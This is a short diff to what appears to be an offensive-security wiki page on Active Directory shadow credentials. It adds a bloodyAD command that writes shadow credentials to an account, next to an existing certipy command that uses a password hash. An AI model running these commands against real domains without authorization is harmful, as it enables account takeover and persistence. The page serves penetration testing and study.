@@ -38,6 +38,14 @@ certipy shadow auto -u <username>@<domain> -hashes :<NTHASH> -account  <target-u
 ```
 {% endcode %}
 {% endtab %}
+
+{% tab title="bloodyAD" %}
+{% code lineNumbers="true" %}
+```bash
+bloodyad -u <username> -p <password> -d <domain> -i <DC-IP> add shadowCredentials <username>
+```
+{% endcode %}
+{% endtab %}
 {% endtabs %}
 
 ### Tools
